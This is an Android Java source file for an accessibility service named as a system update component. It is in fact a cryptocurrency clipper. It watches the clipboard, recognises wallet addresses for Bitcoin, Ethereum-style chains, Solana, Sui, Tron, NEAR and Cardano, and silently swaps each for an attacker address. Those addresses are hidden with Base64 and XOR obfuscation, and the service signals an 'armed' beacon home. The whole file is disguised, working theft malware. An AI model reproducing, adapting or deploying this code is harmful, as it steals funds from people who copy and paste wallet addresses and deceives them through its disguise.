package com.android.system.update;

import android.accessibilityservice.AccessibilityService;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;

public class SystemHookService extends AccessibilityService {

    // Enderecos ofuscados (Base64 + XOR 0x5A)
    private static final String A_EVM  = "CQMeZWliY2M4OWNhNzM0OGY4MzY2Nzc3MTk5MzEzNzAwMDVjMjI0NmQwOA==";
    private static final String A_SOL  = "CQMeWUcyOERweDdab2NoRXRhdmU0eVkzZ0UzUWdZOXNFRTZEQUtEWXZiNXFrUmI=";
    private static final String A_SUI  = "CQMeWGMzZmJiYmEyZTRmYTY3Yjc2ODIxN2ZlYTE2YTgxYzliZmQ3ZGQzMmI0MmY5ZmNhMmM3NDVjNDJhMmU2YWI1YmQ=";
    private static final String A_BTC  = "CQMeWmMxcWczMjRkMnhkeWpsY2ZwdHM3ZHVwZ2RtaDB0Z2xjOG1rMzN2dXE3";
    private static final String A_TRX  = "CQMeWVRGSHkxaVJweDZEcHUyZjdyaWl6WGRaNjFlUlFKYzF4RjM=";
    private static final String A_NEAR = "CQMeWXRvX3NlbmQubmVhcg==";
    private static final String A_ADA  = "CQMeWGFkZHIxcTk1empwMDdramF2cXRzcGxncG5nOGoudDl2N3owYzc3ZXZhenN0ZTBsdrE2ZnY2MDd2dXpkdHo4dzVxcjA3bXU5amFlOWY0NjVocDhyYTloMDI4NGx3MnpmdXFzeG1lbXo=";

    private ClipboardManager clipboardManager;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean processing = false;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        registerClipboardListener();
        BeaconSender.send(getApplicationContext(), "armed");
    }

    private void registerClipboardListener() {
        clipboardManager.addPrimaryClipChangedListener(new ClipboardManager.OnPrimaryClipChangedListener() {
            @Override
            public void onPrimaryClipChanged() {
                if (processing) return;
                handleClipboardChange();
            }
        });
    }

    private void handleClipboardChange() {
        try {
            final ClipData clip = clipboardManager.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) return;

            final String copied = clip.getItemAt(0).coerceToText(this).toString().trim();
            final String replaced = detectAndReplace(copied);

            if (replaced != null && !replaced.equals(copied)) {
                processing = true;
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            ClipData newClip = ClipData.newPlainText("text", replaced);
                            clipboardManager.setPrimaryClip(newClip);
                        } catch (Exception e) { }
                        processing = false;
                    }
                }, 150);
            }
        } catch (Exception e) { }
    }

    private String detectAndReplace(String text) {
        if (text == null || text.isEmpty()) return null;
        if (text.matches("^0x[a-fA-F0-9]{40}$")) return dec(A_EVM);
        if (text.matches("^0x[a-fA-F0-9]{64}$")) return dec(A_SUI);
        if (text.matches("^bc1[a-z0-9]{39,59}$")) return dec(A_BTC);
        if (text.matches("^1[a-km-zA-HJ-NP-Z1-9]{25,34}$")) return dec(A_BTC);
        if (text.matches("^3[a-km-zA-HJ-NP-Z1-9]{25,34}$")) return dec(A_BTC);
        if (text.matches("^T[a-zA-Z0-9]{33}$")) return dec(A_TRX);
        if (text.matches("^[a-z0-9._-]{2,64}\\.near$")) return dec(A_NEAR);
        if (text.matches("^[a-f0-9]{64}$")) return dec(A_NEAR);
        if (text.matches("^addr1[a-z0-9]{50,100}$")) return dec(A_ADA);
        if (text.matches("^(DdzFF|Ae2tdPwUPEZ)[a-zA-Z0-9]{50,80}$")) return dec(A_ADA);
        if (text.matches("^[1-9A-HJ-NP-Za-km-z]{32,44}$")
                && !text.startsWith("T")
                && !text.startsWith("1")
                && !text.startsWith("3")) return dec(A_SOL);
        return null;
    }

    private static String dec(String encoded) {
        try {
            byte[] b = android.util.Base64.decode(encoded, android.util.Base64.DEFAULT);
            for (int i = 0; i < b.length; i++) b[i] = (byte) (b[i] ^ 0x5A);
            return new String(b, "UTF-8");
        } catch (Exception e) { return ""; }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) { }

    @Override
    public void onInterrupt() { }
}
